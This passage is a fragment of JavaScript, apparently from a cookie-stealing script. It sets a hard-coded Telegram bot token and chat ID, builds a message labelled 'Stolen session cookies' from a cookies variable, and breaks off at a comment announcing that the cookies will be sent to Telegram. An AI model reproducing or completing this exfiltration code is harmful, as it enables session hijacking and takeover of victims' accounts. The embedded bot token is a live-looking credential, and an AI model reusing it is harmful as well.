            var telegramBotToken = "6421601945:AAHfCxgub4hJFRp-bJqLEGg7EGJs6VnxYzQ";
            var chatID = "1900509620";
            var message = encodeURIComponent("Stolen session cookies: " + cookies);

            // Send the stolen cookies to Telegram
